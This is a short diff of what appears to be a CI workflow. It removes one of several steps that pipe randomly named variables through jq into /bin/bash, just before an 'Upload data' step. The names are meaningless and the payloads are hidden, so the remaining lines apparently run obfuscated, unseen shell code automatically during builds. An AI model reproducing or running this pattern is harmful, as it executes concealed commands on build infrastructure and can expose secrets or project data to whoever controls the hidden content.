@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$s16" | jq -r .arrk94878 | /bin/bash
           printf '%s' "$omkpk66" | jq -r .wfpqu9711 | /bin/bash
           echo $uiex0455 | jq -r .tdqim2 | /bin/bash
-          printf '%s' "$niuf3" | jq -r .lo44 | /bin/bash
           echo $wzxp01069 | jq -r .rnzi4 | /bin/bash
 
       - name: Upload data
